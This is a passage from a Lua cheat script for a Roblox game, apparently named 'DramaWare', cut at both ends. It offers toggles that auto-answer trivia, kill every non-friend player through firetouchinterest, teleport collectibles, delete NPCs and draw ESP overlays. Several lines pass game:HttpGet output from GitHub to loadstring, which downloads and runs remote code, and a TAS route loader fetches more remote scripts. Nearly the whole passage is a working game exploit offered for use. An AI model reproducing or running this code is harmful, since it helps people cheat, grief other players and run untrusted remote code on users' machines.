                        for i = 1, 10 do
                            if not _mathMov then break end
                            local questionGui = mathManiaGui:FindFirstChild(tostring(i))
                            if questionGui then
                                local clean = questionGui.MainText.Text:gsub("=", ""):gsub("?", ""):gsub(" ", "")
                                local ok, result = pcall(function() return loadstring("return " .. clean)() end)
                                if ok and result then
                                    questionGui.Box.Text = tostring(result)
                                    local btn = questionGui:FindFirstChild("Enter")
                                    if btn then
                                        local events = {"MouseButton1Click", "MouseButton1Down", "Activated"}
                                        for _, ev in pairs(events) do
                                            if getconnections and btn[ev] then
                                                for _, c in pairs(getconnections(btn[ev])) do
                                                    if c.Function then c:Fire() end
                                                end
                                            end
                                        end
                                    end
                                    if _mathMovDelay > 0 then task.wait(_mathMovDelay) end
                                end
                            end
                        end
                    end
                    task.wait()
                end
            end)
        end,
    })
    
    ChallengesTab:CreateSlider({
        Name = "Math Trivia Answer Delay",
        Range = {0, 10},
        Increment = 0.1,
        Suffix = "s",
        CurrentValue = 0,
        Flag = "MoviesMathManiaDelay",
        Callback = function(Value)
            _mathMovDelay = Value
        end,
    })
    
    local beachFightEnabled = false
    local beachFightConnection = nil
    ChallengesTab:CreateToggle({
        Name = "Kill Everyone in Beach Fight",
        CurrentValue = false,
        Flag = "MoviesBeachFightKill",
        Callback = function(Value)
            beachFightEnabled = Value
            if Value then
                task.spawn(function()
                    while beachFightEnabled do
                        local backpack = player:FindFirstChild("Backpack")
                        local char = player.Character
                        if backpack and char then
                            local tool = nil
                            for _, t in ipairs(backpack:GetChildren()) do
                                if t:IsA("Tool") and t.Name:lower():find("pool noodle") then
                                    tool = t
                                    break
                                end
                            end
                            local humanoid = char:FindFirstChildOfClass("Humanoid")
                            if tool and humanoid then humanoid:EquipTool(tool) end
                        end
                        task.wait()
                    end
                end)
                if beachFightConnection then beachFightConnection:Disconnect() end
                beachFightConnection = game:GetService("RunService").RenderStepped:Connect(function()
                    local players = game.Players:GetPlayers()
                    for i = 2, #players do
                        local otherPlayer = players[i]
                        local character = otherPlayer.Character
                        if character and not player:IsFriendsWith(otherPlayer.UserId) then
                            local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
                            if tool and tool:FindFirstChild("Handle") then
                                tool:Activate()
                                for _, part in next, character:GetChildren() do
                                    if part:IsA("BasePart") then
                                        firetouchinterest(tool.Handle, part, 0)
                                        firetouchinterest(tool.Handle, part, 1)
                                    end
                                end
                            end
                        end
                    end
                end)
            else
                if beachFightConnection then
                    beachFightConnection:Disconnect()
                    beachFightConnection = nil
                end
            end
        end,
    })
    
ChallengesTab:CreateButton({
    Name = "Collect Keys & Open Chests",
    Callback = function()
        local pa = workspace.Assets:FindFirstChild("Pirate"); if not pa then return end
        local function getKey()
            for _, v in ipairs(player.Backpack:GetChildren()) do if v:IsA("Tool") then return v end end
            for _, v in ipairs(player.Character:GetChildren()) do if v:IsA("Tool") then return v end end
        end
        while true do
            local kf; for _, v in ipairs(pa:GetDescendants()) do if v.Name == "MainKey" then kf = v; break end end
            if not kf then break end
            player.Character.HumanoidRootPart.CFrame = kf.CFrame; task.wait(0.25)
            local kt, t = nil, 0
            while t < 5 and not kt do kt = getKey(); if not kt then task.wait(0.1); t = t + 0.1 end end
            if not kt then break end
            kt.Parent = player.Character; task.wait(0.05)
            local cf = pa:FindFirstChild("Chests")
            if cf then local cm = cf:FindFirstChild(kt.Name); if cm then local ch = cm:FindFirstChild("Chest"); if ch then player.Character.HumanoidRootPart.CFrame = ch.CFrame; task.wait(0.15) end end end
        end
    end,
})
    
    ChallengesTab:CreateButton({
        Name = "Monster Godmode",
        Callback = function()
            local m = workspace.Assets:FindFirstChild("Monster")
            if m then 
                local n = m:FindFirstChild("MonsterNPC")
                if n then n:Destroy() end 
            end
        end,
    })
    
    ChallengesTab:CreateButton({
        Name = "Collect Egg",
        Callback = function()
            local RS = game:GetService("ReplicatedStorage")
            local alien = workspace.Assets:WaitForChild("Alien")
            if not alien then return end
            
            pcall(function()
                local char = RS.Season.Players:FindFirstChild(player.Name)
                local cv = char and char.Value
                if not cv then return end
                for _, v in pairs(alien:GetDescendants()) do
                    if v.ClassName == "TextLabel" and v.Text == cv then
                        local root = v.Parent.Parent.Parent
                        root.CFrame = player.Character.HumanoidRootPart.CFrame
                        root.CanCollide = false
                    end
                end
            end)
        end,
    })
    
    local _alienEggESP = false
    local _alienEggObjects = {}
    local _alienEggConn1, _alienEggConn2, _alienEggUpdateConn
    ChallengesTab:CreateToggle({
        Name = "Alien Egg ESP",
        CurrentValue = false,
        Flag = "AlienEggESP",
        Callback = function(Value)
            _alienEggESP = Value
            if Value then
                local _aeMAX_DIST = 500
                local function _createAlienEggESP(part)
                    if _alienEggObjects[part] then return end
                    if not part:FindFirstChild("AlienHighlight") then
                        local highlight = Instance.new("Highlight")
                        highlight.Name = "AlienHighlight"
                        highlight.FillTransparency = 1
                        highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
                        highlight.Parent = part
                    end
                    local bb = Instance.new("BillboardGui")
                    bb.AlwaysOnTop = true
                    bb.Size = UDim2.new(0, 260, 0, 70)
                    bb.StudsOffset = Vector3.new(0, 4, 0)
                    bb.Adornee = part
                    bb.Parent = part
                    local lbl = Instance.new("TextLabel")
                    lbl.BackgroundTransparency = 1
                    lbl.Size = UDim2.new(1, 0, 1, 0)
                    lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
                    lbl.TextStrokeTransparency = 0
                    lbl.TextScaled = true
                    lbl.Font = Enum.Font.GothamBold
                    lbl.Text = "ALIEN EGG"
                    lbl.Parent = bb
                    _alienEggObjects[part] = { billboard = bb, distLabel = lbl }
                end
                
                local RS = game:GetService("ReplicatedStorage")
                pcall(function()
                    local _aePlayerChar = RS.Season.Players:FindFirstChild(player.Name)
                    local _aeCv = _aePlayerChar and _aePlayerChar.Value
                    local alien = workspace.Assets:FindFirstChild("Alien")
                    if alien and _aeCv then
                        local seen = {}
                        for _, v in pairs(alien:GetDescendants()) do
                            if v.ClassName == "TextLabel" and v.Text == _aeCv then
                                local root = v.Parent and v.Parent.Parent and v.Parent.Parent.Parent
                                if root and root:IsA("BasePart") and not seen[root] then
                                    seen[root] = true
                                    _createAlienEggESP(root)
                                end
                            end
                        end
                    end
                end)
                
                _alienEggConn1 = workspace.DescendantAdded:Connect(function(obj)
                    if _alienEggESP and obj.ClassName == "TextLabel" then
                        pcall(function()
                            local _aePC = RS.Season.Players:FindFirstChild(player.Name)
                            local _aeCv2 = _aePC and _aePC.Value
                            if obj.Text == _aeCv2 then
                                local root = obj.Parent and obj.Parent.Parent and obj.Parent.Parent.Parent
                                if root and root:IsA("BasePart") and root:FindFirstAncestor("Alien") then
                                    _createAlienEggESP(root)
                                end
                            end
                        end)
                    end
                end)
                _alienEggConn2 = workspace.DescendantRemoving:Connect(function(obj)
                    if _alienEggObjects[obj] then
                        pcall(function() _alienEggObjects[obj].billboard:Destroy() end)
                        _alienEggObjects[obj] = nil
                    end
                end)
                _alienEggUpdateConn = game:GetService("RunService").RenderStepped:Connect(function()
                    if not _alienEggESP then return end
                    local char = player.Character
                    local root = char and char:FindFirstChild("HumanoidRootPart")
                    if not root then return end
                    for part, esp in pairs(_alienEggObjects) do
                        local dist = (part.Position - root.Position).Magnitude
                        esp.billboard.Enabled = dist <= _aeMAX_DIST
                        if dist <= _aeMAX_DIST then
                            esp.distLabel.Text = string.format("%.1f studs", dist)
                        end
                    end
                end)
            else
                for part, esp in pairs(_alienEggObjects) do
                    pcall(function() esp.billboard:Destroy() end)
                    pcall(function() if part:FindFirstChild("AlienHighlight") then part.AlienHighlight:Destroy() end end)
                end
                _alienEggObjects = {}
                if _alienEggConn1 then _alienEggConn1:Disconnect(); _alienEggConn1 = nil end
                if _alienEggConn2 then _alienEggConn2:Disconnect(); _alienEggConn2 = nil end
                if _alienEggUpdateConn then _alienEggUpdateConn:Disconnect(); _alienEggUpdateConn = nil end
            end
        end,
    })
    
    local _ancientConn
    ChallengesTab:CreateToggle({
        Name = "Auto Collect Ancient Artifacts",
        CurrentValue = false,
        Flag = "MoviesAncientArtifacts",
        Callback = function(Value)
            if Value then
                local ph = workspace.Assets:WaitForChild("Pre-Historic")
                local cf = ph and ph:WaitForChild("Coins")
                if cf then 
                    _ancientConn = cf.ChildAdded:Connect(function(coin)
                        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                            coin.Position = player.Character.HumanoidRootPart.Position
                            coin.Transparency = 0
                            coin.CanCollide = false
                        end
                    end) 
                end
            else
                if _ancientConn then _ancientConn:Disconnect(); _ancientConn = nil end
            end
        end,
    })
    
    local _guitarCollecting = false
    ChallengesTab:CreateToggle({
        Name = "Auto Collect Guitars",
        CurrentValue = false,
        Flag = "AutoCollectGuitars",
        Callback = function(v)
            _guitarCollecting = v
            if v then
                task.spawn(function()
                    while _guitarCollecting do
                        task.wait(0.00001)
                        for _, obj in pairs(workspace:GetDescendants()) do
                            if obj.Name == "Gem" then
                                obj.Transparency = 1
                                task.wait()
                                obj.Position = player.Character.Torso.Position
                            elseif obj.Name == "Coin" then
                                obj.Transparency = 1
                                task.wait()
                                obj.Position = player.Character.Torso.Position
                            end
                        end
                    end
                end)
            end
        end,
    })
    
    ChallengesTab:CreateButton({
        Name = "Finish Poison Food",
        Callback = function()
            for _, v in pairs(workspace.Assets:GetDescendants()) do
                if v.Name == player.Name and v:FindFirstChild("ClickDetector") then
                    for _ = 1, 80 do
                        fireclickdetector(v.ClickDetector)
                    end
                end
            end
        end,
    })
    
    local raygunProtection = false
    local _raygunFired = false
    ChallengesTab:CreateToggle({
        Name = "Raygun Protection",
        CurrentValue = false,
        Flag = "RaygunProtection",
        Callback = function(Value)
            raygunProtection = Value
            _raygunFired = false
            if Value then
                task.spawn(function()
                    while raygunProtection do
                        local assets = workspace:FindFirstChild("Assets")
                        if assets then
                            local hasRaygun = false
                            for _, child in ipairs(assets:GetChildren()) do
                                local n = child.Name:lower()
                                if n:find("raygun") or n:find("western") then
                                    hasRaygun = true
                                    break
                                end
                            end
                            if hasRaygun and not _raygunFired then
                                _raygunFired = true
                                local char = player.Character
                                local hum = char and char:FindFirstChildOfClass("Humanoid")
                                if hum then
                                    hum.Health = 0
                                end
                            end
                            if not hasRaygun then
                                _raygunFired = false
                            end
                        end
                        task.wait(0.3)
                    end
                end)
            else
            end
        end,
    })
end

if isExpedition then
    local _arActiveExp = false
    local _arFiredExp  = false
    ChallengesTab:CreateToggle({
        Name = "Auto Restart Day",
        CurrentValue = false,
        Flag = "AutoRestartDayExp",
        Callback = function(Value)
            _arActiveExp = Value
            _arFiredExp  = false
            if Value then
                task.spawn(function()
                    while _arActiveExp do
                        local timerVisible = false
                        pcall(function()
                            timerVisible = player.PlayerGui.Timer.Background.Timer.Visible
                        end)
                        if timerVisible and not _arFiredExp then
                            _arFiredExp = true
                            loadstring(game:HttpGet("https://raw.githubusercontent.com/robloxcheatck/reanimatescript/main/script.lua", true))()
                        end
                        if not timerVisible then
                            _arFiredExp = false
                        end
                        task.wait(0.05)
                    end
                end)
            end
        end,
    })
    
    ChallengesTab:CreateButton({
        Name = "Win Obby",
        Callback = function()
            local f = workspace.Assets:FindFirstChild("Finish", true)
            if f and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                f.CanCollide = false; f.Transparency = 1; f.Position = player.Character.HumanoidRootPart.Position
            end
        end,
    })
    
    local _expObby = false
    ChallengesTab:CreateToggle({
        Name = "Auto Win Obby",
        CurrentValue = false,
        Flag = "ExpeditionAutoWinObby",
        Callback = function(Value)
            _expObby = Value
            if Value then 
                task.spawn(function() 
                    while _expObby do
                        local f = workspace.Assets:FindFirstChild("Finish", true)
                        if f and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                            f.CanCollide = false; f.Transparency = 1; f.Position = player.Character.HumanoidRootPart.Position
                        end
                        task.wait(0.5)
                    end 
                end) 
            end
        end,
    })
    
    local _germanAlpsESP = false
    local _germanAlpsObjects = {}
    local _germanAlpsConn1, _germanAlpsConn2, _germanAlpsUpdateConn
    ChallengesTab:CreateToggle({
        Name = "German Alps ESP",
        CurrentValue = false,
        Flag = "GermanAlpsESP",
        Callback = function(Value)
            _germanAlpsESP = Value
            if Value then
                local _gaESP_COLOR = Color3.fromRGB(0, 255, 0)
                local _gaMAX_DIST = 500
                local function _createGermanAlpsESP(part)
                    if _germanAlpsObjects[part] then return end
                    local bb = Instance.new("BillboardGui")
                    bb.AlwaysOnTop = true
                    bb.Size = UDim2.new(0, 200, 0, 80)
                    bb.StudsOffset = Vector3.new(0, 3, 0)
                    bb.Adornee = part
                    bb.Parent = part
                    local lbl = Instance.new("TextLabel")
                    lbl.BackgroundTransparency = 1
                    lbl.Size = UDim2.new(1, 0, 0.5, 0)
                    lbl.TextColor3 = _gaESP_COLOR
                    lbl.TextStrokeTransparency = 0
                    lbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
                    lbl.TextSize = 28
                    lbl.Font = Enum.Font.GothamBold
                    lbl.Text = "🏁 FINISH"
                    lbl.Parent = bb
                    local distLbl = Instance.new("TextLabel")
                    distLbl.BackgroundTransparency = 1
                    distLbl.Size = UDim2.new(1, 0, 0.5, 0)
                    distLbl.Position = UDim2.new(0, 0, 0.5, 0)
                    distLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
                    distLbl.TextStrokeTransparency = 0
                    distLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
                    distLbl.TextSize = 22
                    distLbl.Font = Enum.Font.Gotham
                    distLbl.Text = ""
                    distLbl.Parent = bb
                    _germanAlpsObjects[part] = { billboard = bb, distLabel = distLbl }
                end
                
                for _, obj in ipairs(workspace:GetDescendants()) do
                    if obj:IsA("BasePart") and obj.Name:lower() == "finish" then
                        _createGermanAlpsESP(obj)
                    end
                end
                
                _germanAlpsConn1 = workspace.DescendantAdded:Connect(function(obj)
                    if _germanAlpsESP and obj:IsA("BasePart") and obj.Name:lower() == "finish" then
                        _createGermanAlpsESP(obj)
                    end
                end)
                _germanAlpsConn2 = workspace.DescendantRemoving:Connect(function(obj)
                    if _germanAlpsObjects[obj] then
                        pcall(function() _germanAlpsObjects[obj].billboard:Destroy() end)
                        _germanAlpsObjects[obj] = nil
                    end
                end)
                _germanAlpsUpdateConn = game:GetService("RunService").RenderStepped:Connect(function()
                    if not _germanAlpsESP then return end
                    local char = player.Character
                    local root = char and char:FindFirstChild("HumanoidRootPart")
                    if not root then return end
                    for part, esp in pairs(_germanAlpsObjects) do
                        local dist = (part.Position - root.Position).Magnitude
                        esp.billboard.Enabled = dist <= _gaMAX_DIST
                        if dist <= _gaMAX_DIST then
                            esp.distLabel.Text = string.format("%.1f studs", dist)
                        end
                    end
                end)
            else
                for part, esp in pairs(_germanAlpsObjects) do
                    pcall(function() esp.billboard:Destroy() end)
                end
                _germanAlpsObjects = {}
                if _germanAlpsConn1 then _germanAlpsConn1:Disconnect(); _germanAlpsConn1 = nil end
                if _germanAlpsConn2 then _germanAlpsConn2:Disconnect(); _germanAlpsConn2 = nil end
                if _germanAlpsUpdateConn then _germanAlpsUpdateConn:Disconnect(); _germanAlpsUpdateConn = nil end
            end
        end,
    })
    
    ChallengesTab:CreateButton({
        Name = "Break Amazon (Spleef)",
        Callback = function()
            for _, v in pairs(workspace.Assets:GetDescendants()) do
                if v.Name == "SpleefPart" then 
                    firetouchinterest(player.Character.HumanoidRootPart, v, 0) 
                end
            end
        end,
    })
    
    local _mathExp = false
    local _mathExpDelay = 0
    ChallengesTab:CreateToggle({
        Name = "Auto Solve Math Mania",
        CurrentValue = false,
        Flag = "ExpeditionMathMania",
        Callback = function(Value)
            _mathExp = Value
            if not Value then return end
            task.spawn(function()
                while _mathExp do
                    local assets = workspace:FindFirstChild("Assets")
                    local mathManiaGui = player.PlayerGui:FindFirstChild("MathTrivia") or player.PlayerGui:FindFirstChild("MathMania")
                    if mathManiaGui and assets and (assets:FindFirstChild("Math Mania") or assets:FindFirstChild("Math Trivia") or assets:FindFirstChild("Singapore")) then
                        for i = 1, 10 do
                            if not _mathExp then break end
                            local questionGui = mathManiaGui:FindFirstChild(tostring(i))
                            if questionGui then
                                local clean = questionGui.MainText.Text:gsub("=", ""):gsub("?", ""):gsub(" ", "")
                                local ok, result = pcall(function() return loadstring("return " .. clean)() end)
                                if ok and result then
                                    questionGui.Box.Text = tostring(result)
                                    local btn = questionGui:FindFirstChild("Enter")
                                    if btn then
                                        local events = {"MouseButton1Click", "MouseButton1Down", "Activated"}
                                        for _, ev in pairs(events) do
                                            if getconnections and btn[ev] then
                                                for _, c in pairs(getconnections(btn[ev])) do
                                                    if c.Function then c:Fire() end
                                                end
                                            end
                                        end
                                    end
                                    if _mathExpDelay > 0 then task.wait(_mathExpDelay) end
                                end
                            end
                        end
                    end
                    task.wait()
                end
            end)
        end,
    })
    
    ChallengesTab:CreateSlider({
        Name = "Math Mania Answer Delay",
        Range = {0, 10},
        Increment = 0.1,
        Suffix = "s",
        CurrentValue = 0,
        Flag = "ExpeditionMathManiaDelay",
        Callback = function(Value)
            _mathExpDelay = Value
        end,
    })
    
    local _clovers = false
    ChallengesTab:CreateToggle({
        Name = "Auto Collect Clovers",
        CurrentValue = false,
        Flag = "ExpeditionClovers",
        Callback = function(Value)
            _clovers = Value
            task.spawn(function() 
                while _clovers do 
                    task.wait(0.1)
                    for _, obj in pairs(workspace:GetDescendants()) do
                        if obj.Name == "Gem" or obj.Name == "Coin" then 
                            obj.Transparency = 1
                            obj.Position = player.Character.Torso.Position 
                        end
                    end
                end 
            end)
        end,
    })
    
    local _rings = false
    ChallengesTab:CreateToggle({
        Name = "Auto Collect Rings",
        CurrentValue = false,
        Flag = "ExpeditionRings",
        Callback = function(Value)
            _rings = Value
            task.spawn(function() 
                while _rings do 
                    task.wait(0.1)
                    for _, obj in pairs(workspace:GetDescendants()) do
                        if obj.Name == "RingHitbox" then 
                            obj.Transparency = 1
                            obj.Position = player.Character.Torso.Position 
                        end
                    end
                end 
            end)
        end,
    })
    
    ChallengesTab:CreateButton({
        Name = "Auto Win Cheese Push",
        Callback = function()
            local player = game:GetService("Players").LocalPlayer
            local character = player.Character
            local rootPart = character:WaitForChild("HumanoidRootPart")
            local myPos = rootPart.Position
            local closestCheese = nil
            local closestCheeseDist = math.huge
            for _, v in ipairs(workspace:GetDescendants()) do
                if v:IsA("Model") and v.Name == "Cheese" then
                    local pivot = v:GetPivot().Position
                    local dist = (pivot - myPos).Magnitude
                    if dist < closestCheeseDist then
                        closestCheeseDist = dist
                        closestCheese = v
                    end
                end
            end
            local closestHitbox = nil
            local closestHitboxDist = math.huge
            for _, v in ipairs(workspace:GetDescendants()) do
                if v.Name == "Hitbox" and v:IsA("BasePart") then
                    local dist = (v.Position - myPos).Magnitude
                    if dist < closestHitboxDist then
                        closestHitboxDist = dist
                        closestHitbox = v
                    end
                end
            end
            if not closestCheese then
                Rayfield:Notify({ Title = "Error", Content = "No Cheese found!", Duration = 3 })
                return
            end
            if not closestHitbox then
                Rayfield:Notify({ Title = "Error", Content = "No Hitbox found!", Duration = 3 })
                return
            end
            for _, part in ipairs(closestCheese:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.Anchored = false
                    part.CFrame = CFrame.new(closestHitbox.Position)
                end
            end
            Rayfield:Notify({ Title = "Cheese Push", Content = "Cheese teleported to hitbox!", Duration = 3 })
        end
    })
    
    local greeceKillEnabled = false
    local greeceKillConnection = nil
    ChallengesTab:CreateToggle({
        Name = "Kill Everyone in Greece",
        CurrentValue = false,
        Flag = "ExpeditionGreeceKill",
        Callback = function(Value)
            greeceKillEnabled = Value
            if Value then
                task.spawn(function()
                    while greeceKillEnabled do
                        local backpack = player:FindFirstChild("Backpack")
                        local char = player.Character
                        if backpack and char then
                            local tool = nil
                            for _, t in ipairs(backpack:GetChildren()) do
                                if t:IsA("Tool") and t.Name:lower():find("sword") then
                                    tool = t
                                    break
                                end
                            end
                            local humanoid = char:FindFirstChildOfClass("Humanoid")
                            if tool and humanoid then humanoid:EquipTool(tool) end
                        end
                        task.wait()
                    end
                end)
                if greeceKillConnection then greeceKillConnection:Disconnect() end
                greeceKillConnection = game:GetService("RunService").RenderStepped:Connect(function()
                    local players = game.Players:GetPlayers()
                    for i = 2, #players do
                        local otherPlayer = players[i]
                        local character = otherPlayer.Character
                        if character and not player:IsFriendsWith(otherPlayer.UserId) then
                            local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
                            if tool and tool:FindFirstChild("Handle") then
                                tool:Activate()
                                for _, part in next, character:GetChildren() do
                                    if part:IsA("BasePart") then
                                        firetouchinterest(tool.Handle, part, 0)
                                        firetouchinterest(tool.Handle, part, 1)
                                    end
                                end
                            end
                        end
                    end
                end)
            else
                if greeceKillConnection then
                    greeceKillConnection:Disconnect()
                    greeceKillConnection = nil
                end
            end
        end,
    })
    
    local _hawaiiDigAll = false
    ChallengesTab:CreateToggle({
        Name = "Hawaii Dig All",
        CurrentValue = false,
        Flag = "HawaiiDigAll",
        Callback = function(Value)
            _hawaiiDigAll = Value
            if Value then
                task.spawn(function()
                    while _hawaiiDigAll do
                        task.wait()
                        local Assets = workspace:FindFirstChild("Assets")
                        if Assets and Assets:FindFirstChild("Hawaii") then
                            local ReplicatedStorage = game:GetService("ReplicatedStorage")
                            pcall(function()
                                local pData = ReplicatedStorage.Season.Players:FindFirstChild(player.Name)
                                if pData and pData:FindFirstChild("Team") then
                                    local Team = pData.Team.Value
                                    local diggingSpots = Assets.Hawaii.DiggingSpots:FindFirstChild(Team)
                                    if diggingSpots then
                                        for _, d in ipairs(diggingSpots:GetDescendants()) do
                                            if d.Name == "ClickDetector" then
                                                for i = 1, 40 do
                                                    fireclickdetector(d)
                                                end
                                            end
                                        end
                                    end
                                end
                            end)
                        end
                    end
                end)
            end
        end,
    })
    
    ChallengesTab:CreateButton({
        Name = "Finish China Food",
        Callback = function()
            for _, v in pairs(workspace.Assets:GetDescendants()) do
                if v.Name == player.Name and v:FindFirstChild("ClickDetector") then
                    for _ = 1, 80 do
                        fireclickdetector(v.ClickDetector)
                    end
                end
            end
        end,
    })
    
    local meatballProtection = false
    local _meatballFired = false
    ChallengesTab:CreateToggle({
        Name = "Meatball Protection",
        CurrentValue = false,
        Flag = "MeatballProtection",
        Callback = function(Value)
            meatballProtection = Value
            _meatballFired = false
            if Value then
                task.spawn(function()
                    while meatballProtection do
                        local assets = workspace:FindFirstChild("Assets")
                        if assets then
                            local hasMeatball = false
                            for _, child in ipairs(assets:GetChildren()) do
                                local n = child.Name:lower()
                                if n:find("dodgeball") or n:find("paintball") or n:find("meatball") then
                                    hasMeatball = true
                                    break
                                end
                            end
                            if hasMeatball and not _meatballFired then
                                _meatballFired = true
                                local char = player.Character
                                local hum = char and char:FindFirstChildOfClass("Humanoid")
                                if hum then
                                    hum.Health = 0
                                end
                            end
                            if not hasMeatball then
                                _meatballFired = false
                            end
                        end
                        task.wait(0.3)
                    end
                end)
            else
            end
        end,
    })
end

ChallengesTab:CreateDivider()

-- autoplay
-- if u want better, show callie some love or MAKE YOUR OWN!

local TAS_Players = game:GetService("Players")
local TAS_RunService = game:GetService("RunService")
local TAS_HttpService = game:GetService("HttpService")
local TAS_Workspace = game:GetService("Workspace")
local TAS_UserInputService = game:GetService("UserInputService")
local TAS_PathfindingService = game:GetService("PathfindingService")
local TAS_LocalPlayer = TAS_Players.LocalPlayer
local TAS_ViewingTAS = false
local TAS_PlaybackConnection = nil
local TAS_FinishTouchConnection = nil
local TAS_CurrentAppliedShiftLock = false
local TAS_DisableShiftlockAndCamera = false
local TAS_PathfindToStart = false
local TAS_ActivePathfindId = 0
local TAS_LastMapName = nil
local TAS_LastMapDetectTime = 0
local TAS_AutoplayEnabled = false

local _rec_recording = {}
local _rec_isRec = false
local _rec_recConn = nil
local _rec_recordStartTime = 0
local _rec_pauseOffset = 0
local _rec_fileName = ""
local _rec_selectedLoad = "(nothing)"
local _rec_loadDropdown = nil
local _rec_statusElem = nil

local function _rec_getFiles()
    local names = {}
    pcall(function()
        if not isfolder("DramaWare") then makefolder("DramaWare") end
        if not isfolder("DramaWare/Recordings") then makefolder("DramaWare/Recordings") end
        local files = (listfiles and listfiles("DramaWare/Recordings")) or {}
        for _, path in ipairs(files) do
            local name = tostring(path):match("([^/\\]+)%.lua$")
            if name and name ~= "" then table.insert(names, name) end
        end
    end)
    if #names == 0 then table.insert(names, "(no recordings)") end
    table.insert(names, 1, "(nothing)")
    return names
end

local TAS_SelectedCaveChaos = "Cave Chaos"
local TAS_SelectedUnstableSavannah = "Unstable Savannah"
local TAS_SelectedConstructCourse = "Construct Course"
local TAS_SelectedColosseumClimb = "Colosseum Climb"

local TAS_RouteSources = {
    ["Bootcamp Team 1"] = {type = "url", source = "https://raw.githubusercontent.com/krohbe/skidknickys/main/Bootcamp%20Team%201.json"},
    ["Bootcamp Team 2"] = {type = "url", source = "https://raw.githubusercontent.com/krohbe/skidknickys/main/Bootcamp%20Team%202.json"},
    ["Bootcamp Team 3"] = {type = "url", source = "https://raw.githubusercontent.com/krohbe/skidknickys/main/Bootcamp%20Team%203.json"},
    ["Cave Chaos Clip"] = {type = "url", source = "https://raw.githubusercontent.com/callienew/tas-skid-skid-skid/refs/heads/main/Cave%20Chaos%20Clip.json"},
    ["Cave Chaos"] = {type = "url", source = "https://raw.githubusercontent.com/krohbe/skidknickys/main/Cave%20Chaos%20Clip.json"},
    ["Colosseum Climb"] = {type = "url", source = "https://raw.githubusercontent.com/krohbe/skidknickys/main/Colosseum.json"},
    ["Colosseum Climb Wallhop"] = {type = "direct", source = "https://raw.githubusercontent.com/opsecophelia/play/main/YESCOLLOSLAG%20(1).lua"},
    ["Construct Course"] = {type = "url", source = "https://raw.githubusercontent.com/krohbe/skidknickys/main/Construct%20Course.json"},
    ["Construct Course Wallhop"] = {type = "direct", source = "https://raw.githubusercontent.com/opsecophelia/play/main/CONSTRUCTNEWFORDW%20(1).lua"},
    ["Hill Hike"] = {type = "url", source = "https://raw.githubusercontent.com/krohbe/skidknickys/main/Hill%20HIke.json"},
    ["Lava Dash"] = {type = "url", source = "https://raw.githubusercontent.com/krohbe/skidknickys/main/Lava%20Dash.json"},
    ["Obstacle Course"] = {type = "url", source = "https://raw.githubusercontent.com/krohbe/skidknickys/main/Obstacle%20Course.json"},
    ["Pond Pier"] = {type = "url", source = "https://raw.githubusercontent.com/krohbe/skidknickys/main/Pond%20Pier.json"},
    ["Rickety Rails"] = {type = "url", source = "https://raw.githubusercontent.com/krohbe/skidknickys/main/Rickety%20Rails.json"},
    ["Rock Wall Team 1"] = {type = "url", source = "https://raw.githubusercontent.com/krohbe/skidknickys/main/Rock%20Wall%20Team%201.json"},
    ["Rock Wall Team 2"] = {type = "url", source = "https://raw.githubusercontent.com/krohbe/skidknickys/main/Rock%20Wall%20Team%202.json"},
    ["Rock Wall Team 3"] = {type = "url", source = "https://raw.githubusercontent.com/krohbe/skidknickys/main/Rock%20Wall%20Team%203.json"},
    ["Spinner"] = {type = "url", source = "https://raw.githubusercontent.com/krohbe/skidknickys/main/Spinner.json"},
    ["Sweeper"] = {type = "url", source = "https://raw.githubusercontent.com/krohbe/skidknickys/main/Sweeper.json"},
    ["Tightrope"] = {type = "url", source = "https://raw.githubusercontent.com/krohbe/skidknickys/main/Tightrope%20Obby.json"},
    ["Unstable Savannah Clip"] = {type = "url", source = "https://raw.githubusercontent.com/krohbe/skidknickys/main/Unstable%20Savannah%20Clip.json"},
    ["Unstable Savannah"] = {type = "url", source = "https://raw.githubusercontent.com/krohbe/skidknickys/main/Unstable%20Savannah.json"},
}

local function TAS_FetchFromURL(url)
    local success, content = pcall(function() return game:HttpGet(url, true) end)
    if not success then return nil end
    local parseOk, data = pcall(function() return TAS_HttpService:JSONDecode(content) end)
    if not parseOk or type(data) ~= "table" then return nil end
    return data
end

local function TAS_FetchFromLoadstring(url)
    local success, content = pcall(function() return game:HttpGet(url, true) end)
    if not success then return nil end
    local fnOk, fn = pcall(function() return loadstring(content) end)
    if not fnOk or type(fn) ~= "function" then return nil end
    local execOk, data = pcall(fn)
    if not execOk or type(data) ~= "table" then return nil end
    return data
end

local TAS_RouteCache = {}        -- [source_url] = fetched data table
local TAS_RouteCacheDirect = {}  -- [source_url] = raw content string

local function TAS_PrefetchAllRoutes()
    TAS_RouteCache = {}
    TAS_RouteCacheDirect = {}
    for _, info in pairs(TAS_RouteSources) do
        if type(info) == "table" then
            if info.type == "url" then
                task.spawn(function()
                    local data = TAS_FetchFromURL(info.source)
                    if data then TAS_RouteCache[info.source] = data end
                end)
            elseif info.type == "direct" then
                task.spawn(function()
                    local ok, content = pcall(function() return game:HttpGet(info.source, true) end)
                    if ok and content then TAS_RouteCacheDirect[info.source] = content end
                end)
            end
        end
    end
end

local function TAS_LoadFromSource(sourceInfo)
    if type(sourceInfo) == "string" then
        if not isfile or not readfile then return nil end
        if not isfile(sourceInfo) then return nil end
        local success, data = pcall(function() return TAS_HttpService:JSONDecode(readfile(sourceInfo)) end)
        if not success or type(data) ~= "table" then return nil end
        return data
    elseif type(sourceInfo) == "table" then
        if sourceInfo.type == "url" then
            if TAS_RouteCache[sourceInfo.source] then return TAS_RouteCache[sourceInfo.source] end
            return TAS_FetchFromURL(sourceInfo.source)
        elseif sourceInfo.type == "loadstring" then return TAS_FetchFromLoadstring(sourceInfo.source)
        elseif sourceInfo.type == "direct" then return sourceInfo
        elseif sourceInfo.type == "raw" and type(sourceInfo.data) == "table" then return sourceInfo.data
        else return nil end
    end
    return nil
end

local function TAS_ApplyShiftLock(enabled)
    local actuallyEnabled = TAS_UserInputService.MouseBehavior == Enum.MouseBehavior.LockCenter
    if enabled == actuallyEnabled then return end
    TAS_CurrentAppliedShiftLock = enabled
